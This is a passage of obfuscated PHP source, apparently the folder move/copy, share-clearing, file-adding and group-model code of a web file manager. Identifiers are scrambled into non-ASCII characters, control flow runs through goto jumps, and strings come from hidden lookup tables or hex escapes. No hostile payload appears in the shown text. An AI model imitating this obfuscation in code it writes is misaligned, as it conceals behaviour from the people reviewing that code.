$DÉĞ†í­Ì, $a¶§â”é¦á = REPEAT_REPLACE, $e‡ößİ™ = '') { goto F•õóãİ¶Ä; ağ˜ƒ³Ñ: if ($DÀİè‡š[$A©àñÈ¶¤‰[461]] == $DÉĞ†í­Ì && $e‡ößİ™ != $DÀİè‡š[$A©àñÈ¶¤‰[28]]) { $fÙ¾®ö  ± = $this->fileNameExist($DÉĞ†í­Ì, $e‡ößİ™); if ($fÙ¾®ö  ± && $DÀİè‡š[$A©àñÈ¶¤‰[370]] == $A©àñÈ¶¤‰[468]) { goto C•À„ŠË‹; DåÙ”¹ •¸: return $fÙ¾®ö  ±; goto Cİõ›ƒ÷ğ; A‚”Ä¾‹™‹: $this->removeNow($b’ô¬Ì‹ñÖ, !1); $this->folderSizeReset($DÉĞ†í­Ì); Hook::trigger($A©àñÈ¶¤‰[532], $A’æÏæºßô); goto DåÙ”¹ •¸; C•À„ŠË‹: $Fä½ó¬Ûê = $this->sourceInfo($fÙ¾®ö  ±); $c¹ÖµŠÜê = $this->fileHistory($Fä½ó¬Ûê, $DÀİè‡š[$A©àñÈ¶¤‰[419]], $DÀİè‡š[$A©àñÈ¶¤‰[77]]); if (!$c¹ÖµŠÜê) { Model($A©àñÈ¶¤‰[422])->remove($DÀİè‡š[$A©àñÈ¶¤‰[419]]); } goto A‚”Ä¾‹™‹; Cİõ›ƒ÷ğ: } } $dñÄÀ¯„ÈÔ = $e‡ößİ™ ? $e‡ößİ™ : $DÀİè‡š[$A©àñÈ¶¤‰[28]]; $this->lockMoveStart($b’ô¬Ì‹ñÖ); goto AË»»»†ê; bñø–è¨: return $bŞäÏ»ß; goto EèĞ–ğ«‰Ä; CÃ™ç‘çà: $this->lockMoveEnd($b’ô¬Ì‹ñÖ); $this->lockWriteEnd($DÉĞ†í­Ì, $dñÄÀ¯„ÈÔ); $this->folderSizeReset($DÀİè‡š[$A©àñÈ¶¤‰[461]]); goto D°íâø˜Æ; AË»»»†ê: $this->lockWriteStart($DÉĞ†í­Ì, $dñÄÀ¯„ÈÔ); $fæÈØŒ²‹á = array($A©àñÈ¶¤‰[501] => array(), $A©àñÈ¶¤‰[533] => !1); $this->clearShare($b’ô¬Ì‹ñÖ, $DÉĞ†í­Ì); goto Cğù£÷ˆá; Cğù£÷ˆá: $c¯İò°¯Î¢ = $this->fileNameExistCache($DÉĞ†í­Ì, $DÀİè‡š[$A©àñÈ¶¤‰[28]]); $bŞäÏ»ß = $this->_move($b’ô¬Ì‹ñÖ, $DÉĞ†í­Ì, $a¶§â”é¦á, $fæÈØŒ²‹á, $e‡ößİ™); $this->sourceCacheClear(); goto a…©Ş¹ß÷ª; D°íâø˜Æ: $this->folderSizeReset($DÉĞ†í­Ì); $eåØ¶º®„Å = array($DÀİè‡š[$A©àñÈ¶¤‰[461]], $DÉĞ†í­Ì); if ($DÀİè‡š[$A©àñÈ¶¤‰[370]] == $A©àñÈ¶¤‰[83]) { $eåØ¶º®„Å[] = $b’ô¬Ì‹ñÖ; } goto B·Í¯…İç¿; a…©Ş¹ß÷ª: if ($DÀİè‡š[$A©àñÈ¶¤‰[370]] == $A©àñÈ¶¤‰[83] && $c¯İò°¯Î¢) { $this->folderSizeResetChildren($bŞäÏ»ß); } Model($A©àñÈ¶¤‰[167])->linkAdd($fæÈØŒ²‹á[$A©àñÈ¶¤‰[501]]); if ($c¯İò°¯Î¢ && $fæÈØŒ²‹á[$A©àñÈ¶¤‰[533]]) { $this->removeNow($b’ô¬Ì‹ñÖ, !1); } goto CÃ™ç‘çà; bñÛŒß‰ğ: if ($DÀİè‡š[$A©àñÈ¶¤‰[461]] == $eÉó¨÷¥‹­[$A©àñÈ¶¤‰[369]]) { if ($DÀİè‡š[$A©àñÈ¶¤‰[397]] == $A©àñÈ¶¤‰[83]) { Model($A©àñÈ¶¤‰[395])->restore(array($b’ô¬Ì‹ñÖ)); } return $b’ô¬Ì‹ñÖ; } $A’æÏæºßô = $this->pathInfoMore($b’ô¬Ì‹ñÖ); if ($this->isParentOf($b’ô¬Ì‹ñÖ, $DÉĞ†í­Ì)) { return !1; } goto d±µ¸‘ ø§; d±µ¸‘ ø§: if (!$DÀİè‡š || !$eÉó¨÷¥‹­ || $eÉó¨÷¥‹­[$A©àñÈ¶¤‰[370]] != $A©àñÈ¶¤‰[83]) { return !1; } Hook::trigger($A©àñÈ¶¤‰[531], $A’æÏæºßô); $this->targetIsDelete = intval($DÀİè‡š[$A©àñÈ¶¤‰[397]]); goto ağ˜ƒ³Ñ; B·Í¯…İç¿: $this->updateModifyTime($eåØ¶º®„Å); Model($A©àñÈ¶¤‰[505])->eventMove($b’ô¬Ì‹ñÖ, $DÀİè‡š[$A©àñÈ¶¤‰[461]], $DÉĞ†í­Ì); Hook::trigger($A©àñÈ¶¤‰[532], $A’æÏæºßô); goto bñø–è¨; F•õóãİ¶Ä: $A©àñÈ¶¤‰ =& $_SERVER[‚Ğ°–—î]; $DÀİè‡š = $this->sourceInfo($b’ô¬Ì‹ñÖ); $eÉó¨÷¥‹­ = $this->sourceInfo($DÉĞ†í­Ì); goto bñÛŒß‰ğ; EèĞ–ğ«‰Ä: } private function _move($b‰„Ñ”ƒÁÇ, $a¸®œ¿¨ê«, $b²“ñŠùÛğ, &$B‚ğ¡­ô‚ª, $F¹¼¶”ªëø = '') { goto F‘»âøÏ‡; e¹ÆæÆîô: $this->lockWriteStart($a¸®œ¿¨ê«, $eŠÑ›¡ÁŠÍ); if (!$aµŞÕ±éÜ) { return $this->_moveForce($b‰„Ñ”ƒÁÇ, $a¸®œ¿¨ê«, $eŠÑ›¡ÁŠÍ); } $cù¿ˆâã½– = $aµŞÕ±éÜ; goto bŠÉ§¬ïÑ¶; bŠÉ§¬ïÑ¶: $Bï¢ÃŒ¿ùî = !1; if ($Bõ´‹¨Æ°Ÿ) { if ($b²“ñŠùÛğ == REPEAT_RENAME_FOLDER) { $eŠÑ›¡ÁŠÍ = $this->fileNameAuto($a¸®œ¿¨ê«, $eŠÑ›¡ÁŠÍ, $b²“ñŠùÛğ, $Bõ´‹¨Æ°Ÿ); $cù¿ˆâã½– = $this->_moveForce($b‰„Ñ”ƒÁÇ, $a¸®œ¿¨ê«, $eŠÑ›¡ÁŠÍ); } else { if ($b²“ñŠùÛğ == REPEAT_RENAME_FOLDER) { $b²“ñŠùÛğ = REPEAT_RENAME; } $e°ŸöÅßÂ¬ = $this->_childrenListSelect($b‰„Ñ”ƒÁÇ); foreach ($e°ŸöÅßÂ¬ as $CíÍäÎ–è‚) { $this->_move($CíÍäÎ–è‚[$fŒÚĞÖ›„‡[369]], $aµŞÕ±éÜ, $b²“ñŠùÛğ, $B‚ğ¡­ô‚ª); } $Bï¢ÃŒ¿ùî = !0; } } else { if ($b²“ñŠùÛğ == REPEAT_SKIP) { $Bï¢ÃŒ¿ùî = !0; } else { if ($b²“ñŠùÛğ == REPEAT_RENAME || $b²“ñŠùÛğ == REPEAT_RENAME_FOLDER) { $eŠÑ›¡ÁŠÍ = $this->fileNameAuto($a¸®œ¿¨ê«, $eŠÑ›¡ÁŠÍ, $b²“ñŠùÛğ, $Bõ´‹¨Æ°Ÿ); $cù¿ˆâã½– = $this->_moveForce($b‰„Ñ”ƒÁÇ, $a¸®œ¿¨ê«, $eŠÑ›¡ÁŠÍ); } else { if ($b²“ñŠùÛğ == REPEAT_REPLACE) { $d§÷³ôš = $this->sourceInfoCache($aµŞÕ±éÜ); $Eœ×™ƒÉ©ô = $this->fileHistory($d§÷³ôš, $eèÃ™õÖ„”[$fŒÚĞÖ›„‡[419]], $eèÃ™õÖ„”[$fŒÚĞÖ›„‡[77]]); if ($Eœ×™ƒÉ©ô) { $B‚ğ¡­ô‚ª[$fŒÚĞÖ›„‡[501]][] = $eèÃ™õÖ„”[$fŒÚĞÖ›„‡[419]]; } else { $Bï¢ÃŒ¿ùî = !0; } } } } } if ($Bï¢ÃŒ¿ùî && !$B‚ğ¡­ô‚ª[$fŒÚĞÖ›„‡[533]]) { $B‚ğ¡­ô‚ª[$fŒÚĞÖ›„‡[533]] = !0; } goto b¥¿óÄíÔ‚; F‘»âøÏ‡: $fŒÚĞÖ›„‡ =& $_SERVER[‚Ğ°–—î]; $eèÃ™õÖ„” = $this->sourceInfo($b‰„Ñ”ƒÁÇ); $Bõ´‹¨Æ°Ÿ = $eèÃ™õÖ„”[$fŒÚĞÖ›„‡[370]] == $fŒÚĞÖ›„‡[83]; goto fùˆ„™“Ğ±; b¥¿óÄíÔ‚: return $cù¿ˆâã½–; goto D»Ã¼‚ùÅö; fùˆ„™“Ğ±: $eŠÑ›¡ÁŠÍ = $F¹¼¶”ªëø ? $F¹¼¶”ªëø : $eèÃ™õÖ„”[$fŒÚĞÖ›„‡[28]]; $aµŞÕ±éÜ = $this->fileNameExistCache($a¸®œ¿¨ê«, $eŠÑ›¡ÁŠÍ); $this->lockMoveStart($b‰„Ñ”ƒÁÇ); goto e¹ÆæÆîô; D»Ã¼‚ùÅö: } private function _moveForce($dÔ²¨ÛŞĞ, $a”âÕğ¹»‰, $Cå¸ÕÂæ) { goto c¯‡Á¿ÆÎ; A“–æ„Ï¥ø: if (!$b†–å‘˜æ§) { Model($F·øí§Îª[454])->authClear($dÔ²¨ÛŞĞ); } $bïŞ™œÉƒ¨ = $Cª¿ÇÌÔ‘ä[$F·øí§Îª[397]] == $F·øí§Îª[83] && $eÖ‹Œ°ÑÔµ[$F·øí§Îª[397]] != $F·øí§Îª[83]; if ($bïŞ™œÉƒ¨) { $EøÕØšøóŠ[$F·øí§Îª[396]] = 0; } goto bË¯ °í–ñ; bË¯ °í–ñ: if ($aŠ²±÷ÈíÌ) { $A‰É„Õ¶„ç = array($F·øí§Îª[525] => array($F·øí§Îª[483], $Cª¿ÇÌÔ‘ä[$F·øí§Îª[459]] . $Cª¿ÇÌÔ‘ä[$F·øí§Îª[369]] . $F·øí§Îª[484])); $b½èÁ×ğÀ = $Cª¿ÇÌÔ‘ä[$F·øí§Îª[459]] . $Cª¿ÇÌÔ‘ä[$F·øí§Îª[369]] . $F·øí§Îª[47]; $dë¿Ä–´ğõ = $eÖ‹Œ°ÑÔµ[$F·øí§Îª[459]] . $eÖ‹Œ°ÑÔµ[$F·øí§Îª[369]] . $F·øí§Îª[47] . $Cª¿ÇÌÔ‘ä[$F·øí§Îª[369]] . $F·øí§Îª[47]; $f£ÙÔ—ÈÕ› = array($F·øí§Îª[525] => array($F·øí§Îª[534], "\x72\145\x70\154\141\x63\145\x28\x70\x61\x72\145\156\164\114\x65\x76\145\x6c\x2c\x27{$b½èÁ×ğÀ}\47\54\x27{$dë¿Ä–´ğõ}\x27\51"), $F·øí§Îª[521] => $eÖ‹Œ°ÑÔµ[$F·øí§Îª[371]], $F·øí§Îª[522] => $eÖ‹Œ°ÑÔµ[$F·øí§Îª[456]]); if ($bïŞ™œÉƒ¨) { $f£ÙÔ—ÈÕ›[$F·øí§Îª[396]] = 0; } $this->where($A‰É„Õ¶„ç)->data($f£ÙÔ—ÈÕ›)->save(); } $this->where(array($F·øí§Îª[383] => $dÔ²¨ÛŞĞ))->data($EøÕØšøóŠ)->save(); return $dÔ²¨ÛŞĞ; goto eóÑÅµãë³; c¯‡Á¿ÆÎ: $F·øí§Îª =& $_SERVER[‚Ğ°–—î]; $Cª¿ÇÌÔ‘ä = $this->sourceInfo($dÔ²¨ÛŞĞ); $eÖ‹Œ°ÑÔµ = $this->sourceInfo($a”âÕğ¹»‰); goto bã©Úò±¹Ì; bã©Úò±¹Ì: $aŠ²±÷ÈíÌ = $Cª¿ÇÌÔ‘ä[$F·øí§Îª[370]] == $F·øí§Îª[83]; $EøÕØšøóŠ = array($F·øí§Îª[368] => $eÖ‹Œ°ÑÔµ[$F·øí§Îª[369]], $F·øí§Îª[525] => $eÖ‹Œ°ÑÔµ[$F·øí§Îª[459]] . $eÖ‹Œ°ÑÔµ[$F·øí§Îª[369]] . $F·øí§Îª[47], $F·øí§Îª[521] => $eÖ‹Œ°ÑÔµ[$F·øí§Îª[371]], $F·øí§Îª[522] => $eÖ‹Œ°ÑÔµ[$F·øí§Îª[456]], $F·øí§Îª[524] => USER_ID, $F·øí§Îª[386] => $Cå¸ÕÂæ); $b†–å‘˜æ§ = $Cª¿ÇÌÔ‘ä[$F·øí§Îª[371]] == SourceModel::TYPE_GROUP && $eÖ‹Œ°ÑÔµ[$F·øí§Îª[371]] == SourceModel::TYPE_GROUP && $Cª¿ÇÌÔ‘ä[$F·øí§Îª[456]] == $eÖ‹Œ°ÑÔµ[$F·øí§Îª[456]]; goto A“–æ„Ï¥ø; eóÑÅµãë³: } private function clearShare($a½‘ã­, $CËí‹ÂªöÜ) { goto cõÖ©ÈÔà«; c¥×±‡í™: if (!$E‚É´ÂÔÕ) { return; } $A·ÄòÂ·áù = array($A Ö®‡èƒ[369] => array($A Ö®‡èƒ[7], $E‚É´ÂÔÕ), $A Ö®‡èƒ[448] => 1); $d£Õ¦Ú = Model($A Ö®‡èƒ[536])->field($A Ö®‡èƒ[441])->where($A·ÄòÂ·áù)->select(); goto b¨Ÿ£Š·¿Ñ; cõÖ©ÈÔà«: $A Ö®‡èƒ =& $_SERVER[‚Ğ°–—î]; $eÎøÅèÏÇ = $this->sourceInfo($a½‘ã­); $D‘Õ‡¾Ğ‚˜ = $this->sourceInfo($CËí‹ÂªöÜ); goto e±Ó§‚´Ğ²; e±Ó§‚´Ğ²: if ($eÎøÅèÏÇ[$A Ö®‡èƒ[456]] == $D‘Õ‡¾Ğ‚˜[$A Ö®‡èƒ[456]] && $eÎøÅèÏÇ[$A Ö®‡èƒ[371]] == $A Ö®‡èƒ[535]) { return; } $A·ÄòÂ·áù = array($A Ö®‡èƒ[459] => array($A Ö®‡èƒ[483], $eÎøÅèÏÇ[$A Ö®‡èƒ[459]] . $a½‘ã­ . $A Ö®‡èƒ[484])); $E‚É´ÂÔÕ = $this->field($A Ö®‡èƒ[383])->where($A·ÄòÂ·áù)->getField($A Ö®‡èƒ[369], !0); goto c¥×±‡í™; b¨Ÿ£Š·¿Ñ: if (!$d£Õ¦Ú) { return; } $d£Õ¦Ú = array_to_keyvalue($d£Õ¦Ú, $A Ö®‡èƒ[33], $A Ö®‡èƒ[441]); $A·ÄòÂ·áù = array($A Ö®‡èƒ[441] => array($A Ö®‡èƒ[7], $d£Õ¦Ú)); goto FÅ·Î‡©Î„; FÅ·Î‡©Î„: Model($A Ö®‡èƒ[536])->where($A·ÄòÂ·áù)->save(array($A Ö®‡èƒ[448] => 0)); Model($A Ö®‡èƒ[537])->where($A·ÄòÂ·áù)->delete(); goto b‰¦†ÄåÌ; b‰¦†ÄåÌ: } public function copyFolderFromIO($fÀ·ÒƒÀŸ, $aêÀ†‚ÌöÂ, $fŞ³Ã†òß», $DÀ¡ó·Ëà, $cÄõ²‰‚“é, $EÄ„©â§ = false) { goto eÇÎ°Äâ»; E” Ÿ¢ò¶: $this->updateModifyTime($fŞ³Ã†òß»); return $c•ÖÛøìäò; goto EÜõŒì²ˆ¯; f›«·§ƒÍ¶: Model($D¼¶Å¤èç´[422])->linkAdd($a¶³¨Ó“²[$D¼¶Å¤èç´[501]]); Model($D¼¶Å¤èç´[422])->remove($a¶³¨Ó“²[$D¼¶Å¤èç´[538]]); $this->folderSizeReset($fŞ³Ã†òß»); goto E” Ÿ¢ò¶; e¸µ‡¿È¶: $Dë†¼¨ËÌç = $this->fileNameExist($fŞ³Ã†òß», $AÚ¾¼«“š—); $c•ÖÛøìäò = $this->mkdir($fŞ³Ã†òß», $AÚ¾¼«“š—, $DÀ¡ó·Ëà); if (!$Dë†¼¨ËÌç || $DÀ¡ó·Ëà == REPEAT_RENAME_FOLDER) { $DÀ¡ó·Ëà = !1; } goto C©ÊœóâÌË; eÇÎ°Äâ»: $D¼¶Å¤èç´ =& $_SERVER[‚Ğ°–—î]; $a¶³¨Ó“² = array($D¼¶Å¤èç´[502] => array(), $D¼¶Å¤èç´[503] => array(), $D¼¶Å¤èç´[501] => array(), $D¼¶Å¤èç´[538] => array()); $AÚ¾¼«“š— = $EÄ„©â§ ? $EÄ„©â§ : $fÀ·ÒƒÀŸ->getPathName($fÀ·ÒƒÀŸ->pathThis($aêÀ†‚ÌöÂ)); goto e¸µ‡¿È¶; C©ÊœóâÌË: if ($Dë†¼¨ËÌç) { $this->_childrenAllMake($Dë†¼¨ËÌç); } Hook::trigger($D¼¶Å¤èç´[539]); $this->_copyChildTo($fÀ·ÒƒÀŸ, $aêÀ†‚ÌöÂ, $c•ÖÛøìäò, $DÀ¡ó·Ëà, $a¶³¨Ó“², $cÄõ²‰‚“é); goto DŒÄÜ…ºÄ; DŒÄÜ…ºÄ: Hook::trigger($D¼¶Å¤èç´[540]); if ($c•ÖÛøìäò) { $this->folderSizeResetChildren($c•ÖÛøìäò); } $this->_childrenListClear(); goto C½¢ˆ¡Ò½ï; C½¢ˆ¡Ò½ï: Model($D¼¶Å¤èç´[504])->addAll($a¶³¨Ó“²[$D¼¶Å¤èç´[502]], array(), !0); Model($D¼¶Å¤èç´[505])->eventCopy($c•ÖÛøìäò); $this->saveAll($a¶³¨Ó“²[$D¼¶Å¤èç´[503]]); goto f›«·§ƒÍ¶; EÜõŒì²ˆ¯: } private function _copyChildTo($Fòã†š¿•©, $BŸ¦Ë·Ü³, $f¯ÈôÆó‹¢, $CğÜ‘ô¸À±, &$BÌÌ­˜£©, $F›¯»çĞ) { goto b‹Ú˜¡’À’; B¹À ÓÎæÈ: foreach ($Eéˆà‘…Ì³ as &$då¸Š›êŠ³) { goto e¦²ãÍ§Œ; a«¶Ÿê‚ƒ²: if ($CğÜ‘ô¸À±) { $dïÒÍ¿ãËŠ = $this->fileNameExistCache($f¯ÈôÆó‹¢, $då¸Š›êŠ³[$EÑÃåÓõº‹[28]]); if ($dïÒÍ¿ãËŠ) { if ($då¸Š›êŠ³[$EÑÃåÓõº‹[370]] || $CğÜ‘ô¸À± == REPEAT_SKIP) { continue; } if ($CğÜ‘ô¸À± == REPEAT_REPLACE) { $c‘÷•å‹‚ = $this->sourceInfoCache($dïÒÍ¿ãËŠ); $d‡é–ŞÌö = $this->fileHistory($c‘÷•å‹‚, $då¸Š›êŠ³[$EÑÃåÓõº‹[419]], $då¸Š›êŠ³[$EÑÃåÓõº‹[77]]); if ($d‡é–ŞÌö) { $BÌÌ­˜£©[$EÑÃåÓõº‹[501]][] = $då¸Š›êŠ³[$EÑÃåÓõº‹[419]]; } continue; } else { if ($CğÜ‘ô¸À± == REPEAT_RENAME) { $då¸Š›êŠ³[$EÑÃåÓõº‹[28]] = $this->fileNameAutoCache($f¯ÈôÆó‹¢, $då¸Š›êŠ³[$EÑÃåÓõº‹[28]], $CğÜ‘ô¸À±, !1); } } } } if (!$då¸Š›êŠ³[$EÑÃåÓõº‹[370]] && $då¸Š›êŠ³[$EÑÃåÓõº‹[419]]) { $BÌÌ­˜£©[$EÑÃåÓõº‹[501]][] = $då¸Š›êŠ³[$EÑÃåÓõº‹[419]]; } $c‡§ğ˜î[] = $this->_makeItemData($då¸Š›êŠ³, $e‰°¨Ã¿ë¼, $då¸Š›êŠ³[$EÑÃåÓõº‹[28]]); goto BÌí¾Í°·Á; EÎåÜ¬ñ³›: $då¸Š›êŠ³[$EÑÃåÓõº‹[77]] = _get($då¸Š›êŠ³, $EÑÃåÓõº‹[77], 0); $då¸Š›êŠ³[$EÑÃåÓõº‹[419]] = _get($då¸Š›êŠ³, $EÑÃåÓõº‹[419], 0); if (!isset($då¸Š›êŠ³[$EÑÃåÓõº‹[541]]) && $då¸Š›êŠ³[$EÑÃåÓõº‹[419]]) { $BÌÌ­˜£©[$EÑÃåÓõº‹[538]][] = $då¸Š›êŠ³[$EÑÃåÓõº‹[419]]; } goto a«¶Ÿê‚ƒ²; e¦²ãÍ§Œ: if (isset($eÑ£­ˆ–¥¾[$då¸Š›êŠ³[$EÑÃåÓõº‹[28]]])) { $då¸Š›êŠ³ = $eÑ£­ˆ–¥¾[$då¸Š›êŠ³[$EÑÃåÓõº‹[28]]]; } $då¸Š›êŠ³[$EÑÃåÓõº‹[370]] = $då¸Š›êŠ³[$EÑÃåÓõº‹[29]] == $EÑÃåÓõº‹[76]; $då¸Š›êŠ³[$EÑÃåÓõº‹[372]] = _get($då¸Š›êŠ³, $EÑÃåÓõº‹[160], $EÑÃåÓõº‹[33]); goto EÎåÜ¬ñ³›; BÌí¾Í°·Á: } unset($då¸Š›êŠ³); if (!empty($c‡§ğ˜î)) { $this->addAll($c‡§ğ˜î); } goto cªâ¯¿ÌÈ×; cªâ¯¿ÌÈ×: $BƒØĞ‚Õ¥ = $this->_childrenList($f¯ÈôÆó‹¢); $BƒØĞ‚Õ¥ = array_to_keyvalue($BƒØĞ‚Õ¥, $EÑÃåÓõº‹[28]); foreach ($Eéˆà‘…Ì³ as $då¸Š›êŠ³) { $c‘÷•å‹‚ = $BƒØĞ‚Õ¥[$då¸Š›êŠ³[$EÑÃåÓõº‹[28]]]; $e§›‹¦ã‘ö = $c‘÷•å‹‚[$EÑÃåÓõº‹[369]]; $this->_copyApplyMeta($c‘÷•å‹‚, $BÌÌ­˜£©); if ($då¸Š›êŠ³[$EÑÃåÓõº‹[29]] == $EÑÃåÓõº‹[76]) { $då¸Š›êŠ³[$EÑÃåÓõº‹[75]] = $Fòã†š¿•©->getPathInner($då¸Š›êŠ³[$EÑÃåÓõº‹[75]]); $this->_copyChildTo($Fòã†š¿•©, $då¸Š›êŠ³[$EÑÃåÓõº‹[75]], $e§›‹¦ã‘ö, $CğÜ‘ô¸À±, $BÌÌ­˜£©, $F›¯»çĞ); } } goto F‡³†˜éß; b‹Ú˜¡’À’: $EÑÃåÓõº‹ =& $_SERVER[‚Ğ°–—î]; $e‰°¨Ã¿ë¼ = $this->sourceInfoCache($f¯ÈôÆó‹¢); $AÉÒ‹ÙÙ ” = $Fòã†š¿•©->listPath($BŸ¦Ë·Ü³, !1, !0); goto b¥æÁÈâÎÅ; b¥æÁÈâÎÅ: $Eéˆà‘…Ì³ = array_merge($AÉÒ‹ÙÙ ”[$EÑÃåÓõº‹[73]], $AÉÒ‹ÙÙ ”[$EÑÃåÓõº‹[74]]); $eÑ£­ˆ–¥¾ = $this->_addFiles($Fòã†š¿•©, $AÉÒ‹ÙÙ ”[$EÑÃåÓõº‹[73]], $F›¯»çĞ); $c‡§ğ˜î = array(); goto B¹À ÓÎæÈ; F‡³†˜éß: } private function _addFiles($Có“é™Ø‡ç, $d£¬â‚©Â´, $Cß„óœ¹ïÊ) { goto cºœ¾§ÆÍ÷; cºœ¾§ÆÍ÷: $CœŠ÷†é›Š =& $_SERVER[‚Ğ°–—î]; if (!$d£¬â‚©Â´ || count($d£¬â‚©Â´) == 0) { return array(); } $CÈÊ˜ ªÈÇ = array(); goto cò‘•Š±¿…; CŠŞà‘Á: $aÙùì¶ = $a³¦…ƒ°Í->where($C‰¸ô°ÊÊ)->select(); $aÙùì¶ = $aÙùì¶ ? $aÙùì¶ : array(); foreach ($aÙùì¶ as $FÂ¹ĞµÊó) { if (!isset($CÈÊ˜ ªÈÇ[$FÂ¹ĞµÊó[$CœŠ÷†é›Š[163]]])) { continue; } $cà«ÃËæÈ = $CÈÊ˜ ªÈÇ[$FÂ¹ĞµÊó[$CœŠ÷†é›Š[163]]]; foreach ($cà«ÃËæÈ as &$dÅ§¢ñ–¢á) { $dÅ§¢ñ–¢á[$CœŠ÷†é›Š[419]] = $FÂ¹ĞµÊó[$CœŠ÷†é›Š[419]]; $dÅ§¢ñ–¢á[$CœŠ÷†é›Š[541]] = !0; } unset($dÅ§¢ñ–¢á); } goto D¬æß’²ƒå; bãÇÄ÷æ˜š: foreach ($aÙùì¶ as $FÂ¹ĞµÊó) { if (!isset($CÈÊ˜ ªÈÇ[$FÂ¹ĞµÊó[$CœŠ÷†é›Š[163]]])) { continue; } $A‡°ô§µÈ‘ =& $CÈÊ˜ ªÈÇ[$FÂ¹ĞµÊó[$CœŠ÷†é›Š[163]]]; foreach ($A‡°ô§µÈ‘ as &$dÅ§¢ñ–¢á) { $dÅ§¢ñ–¢á[$CœŠ÷†é›Š[419]] = $FÂ¹ĞµÊó[$CœŠ÷†é›Š[419]]; } unset($dÅ§¢ñ–¢á); } $fŠİï ÛÄÄ = array(); foreach ($d£¬â‚©Â´ as $fŞä‹êø÷) { $fŠİï ÛÄÄ[$fŞä‹êø÷[$CœŠ÷†é›Š[28]]] = $fŞä‹êø÷; } goto AÁ‹£ÈŒÑ; cò‘•Š±¿…: foreach ($d£¬â‚©Â´ as &$dÅ§¢ñ–¢á) { goto aî°»¡”¬à; cô–Š÷¯ŒÜ: if (count($CÈÊ˜ ªÈÇ[$F„Æ½‡ä§]) > 1) { $dÅ§¢ñ–¢á[$CœŠ÷†é›Š[541]] = !0; } goto f˜İãœÛÀ; FŠìÓ‹ó¼ã: $dÅ§¢ñ–¢á[$CœŠ÷†é›Š[163]] = $F„Æ½‡ä§; Hook::trigger($CœŠ÷†é›Š[543], $dÅ§¢ñ–¢á); $CÈÊ˜ ªÈÇ[$F„Æ½‡ä§][] =& $dÅ§¢ñ–¢á; goto cô–Š÷¯ŒÜ; aî°»¡”¬à: Hook::trigger($CœŠ÷†é›Š[542], $dÅ§¢ñ–¢á); $dÅ§¢ñ–¢á[$CœŠ÷†é›Š[75]] = $Có“é™Ø‡ç->getPathInner($dÅ§¢ñ–¢á[$CœŠ÷†é›Š[75]]); $BÏñºä¯æ = $Có“é™Ø‡ç->hashSimple($dÅ§¢ñ–¢á[$CœŠ÷†é›Š[75]]); goto e–Ÿî‰»‰Ê; e–Ÿî‰»‰Ê: $F„Æ½‡ä§ = $Có“é™Ø‡ç->hashMd5($dÅ§¢ñ–¢á[$CœŠ÷†é›Š[75]]); if (strlen($F„Æ½‡ä§) > 10 && !isset($CÈÊ˜ ªÈÇ[$F„Æ½‡ä§])) { $CÈÊ˜ ªÈÇ[$F„Æ½‡ä§] = array(); } $dÅ§¢ñ–¢á[$CœŠ÷†é›Š[164]] = $BÏñºä¯æ; goto FŠìÓ‹ó¼ã; f˜İãœÛÀ: } $C‰¸ô°ÊÊ = array($CœŠ÷†é›Š[163] => array($CœŠ÷†é›Š[7], array_keys($CÈÊ˜ ªÈÇ))); $a³¦…ƒ°Í = Model($CœŠ÷†é›Š[544]); goto CŠŞà‘Á; D¬æß’²ƒå: $f¤Œ¸… = array(); foreach ($d£¬â‚©Â´ as $f®ˆ£ßƒÀ) { if (isset($f®ˆ£ßƒÀ[$CœŠ÷†é›Š[541]]) && $f®ˆ£ßƒÀ[$CœŠ÷†é›Š[541]]) { continue; } $AéçôšƒĞ‘ = $Có“é™Ø‡ç->getPathInner($f®ˆ£ßƒÀ[$CœŠ÷†é›Š[75]]); $eÒ¦´¶ŸÈß = $a³¦…ƒ°Í->addFileMake($AéçôšƒĞ‘, $f®ˆ£ßƒÀ[$CœŠ÷†é›Š[77]], $f®ˆ£ßƒÀ[$CœŠ÷†é›Š[164]], $f®ˆ£ßƒÀ[$CœŠ÷†é›Š[163]], $f®ˆ£ßƒÀ[$CœŠ÷†é›Š[28]], $Cß„óœ¹ïÊ); $f¤Œ¸…[] = $eÒ¦´¶ŸÈß; } $a³¦…ƒ°Í->addAll($f¤Œ¸…); goto c—‰éÂ¤Óä; c—‰éÂ¤Óä: $C‰¸ô°ÊÊ = array($CœŠ÷†é›Š[163] => array($CœŠ÷†é›Š[7], array_keys($CÈÊ˜ ªÈÇ))); $aÙùì¶ = $a³¦…ƒ°Í->where($C‰¸ô°ÊÊ)->select(); $aÙùì¶ = $aÙùì¶ ? $aÙùì¶ : array(); goto bãÇÄ÷æ˜š; AÁ‹£ÈŒÑ: return $fŠİï ÛÄÄ; goto Cé®™ƒ­ÖÄ; Cé®™ƒ­ÖÄ: } } define($_SERVER[‚Ğ°–—î][545], $_SERVER[‚Ğ°–—î][546]); goto bÆÜ“Äé©‘; FæôÛÖÕ½á: class GroupModel extends ModelBase { protected $tableName = "\x67\x72\x6f\165\x70"; protected $tableMeta = array("\x74\141\x62\x6c\x65\x4e\141\155\145" => "\147\162\157\165\x70\137\155\x65\x74\x61", "\x6d\x65\x74\x61\x46\x69\x65\x6c\144" => "\147\162\157\165\160\111\x44"); protected function cacheFunctionAlias($c’æ²Ğ¾¦…) { $bî›®¬‰­â =& $_SERVER[‚Ğ°–—î]; return array($bî›®¬‰­â[2173] => array($c’æ²Ğ¾¦…[0], $bî›®¬‰­â[2174]), $bî›®¬‰­â[2175] => array($c’æ²Ğ¾¦…[0], $bî›®¬‰­â[2174])); } protected function getInfo($aØœÙá) { $b¦ˆ‹á†ìß = $this->getInfoSimple($aØœÙá); if (!$b¦ˆ‹á†ìß) { return !1; } return $this->_listDataApplyItem($b¦ˆ‹á†ìß); } protected function getInfoSimple($e¶µ‡¼ª–ª, $eÒ“÷Îµ¨é = false) { $fÓÑÔÖŠ’İ =& $_SERVER[‚Ğ°–—î]; if ($eÒ“÷Îµ¨é) { $C°‘õ¬«”º = array($fÓÑÔÖŠ’İ[2107] => intval($e¶µ‡¼ª–ª)); $e‰…šÄåÔ» = $this->where($C°‘õ¬«”º)->find(); return is_array($e‰…šÄåÔ») ? $e‰…šÄåÔ» : array(); } return $this->cacheFunctionGet($fÓÑÔÖŠ’İ[2176], $e¶µ‡¼ª–ª); } protected function groupAdd($dºËóŞ à) { goto a¿øÊÚÃÂÀ; a¿øÊÚÃÂÀ: $CÂšŒˆ„³¶ =& $_SERVER[‚Ğ°–—î]; if (!$dºËóŞ à[$CÂšŒˆ„³¶[461]] && isset($dºËóŞ à[$CÂšŒˆ„³¶[2107]]) && $dºËóŞ à[$CÂšŒˆ„³¶[2107]] == 1) { if 